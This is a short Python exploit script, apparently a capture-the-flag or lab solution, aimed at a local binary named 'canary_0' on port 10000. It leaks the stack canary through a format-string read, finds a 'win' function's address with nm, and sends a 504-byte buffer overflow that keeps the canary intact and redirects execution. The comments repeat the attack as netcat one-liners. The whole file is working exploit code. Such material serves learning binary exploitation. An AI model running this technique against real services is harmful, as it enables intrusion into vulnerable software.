import socket
import struct
import re
import subprocess 

# python -c 'print  "%69$lx" ' | nc localhost 10000; echo ""
# python -c 'print "A"*504 + "\x41\x95\xc7\x22\x92\x4d\xb4\x00"[::-1] + "BBBBBBBB"+ "\x00\x00\x00\x00\x00\x40\x12\x46"[::-1] ' | nc localhost 10000

def get_canary():
	s = socket.create_connection(("localhost",10000))
	s.send(b"%69$lx\x0a")
	canary = s.recv(16)
	print("received canary:" + str(canary))

	s.close()
	return int(canary,16).to_bytes(8,'little', signed=False) 

def get_win():
	nm = subprocess.Popen(('nm', './canary_0'), stdout=subprocess.PIPE)
	output = subprocess.check_output(('grep', 'win'), stdin=nm.stdout)
	nm.wait()
	output = output[:16]
	print("win at address:" + str(output[:16]))
	return int(output, 16).to_bytes(8,'little', signed=False) 


payload = b"A"*504
payload += get_canary()
payload += b"B"*8 
payload += get_win()
payload += b"\x0a"

s = socket.create_connection(("localhost",10000))
s.send(payload)
output = s.recv(2048)
s.close()
print(output)


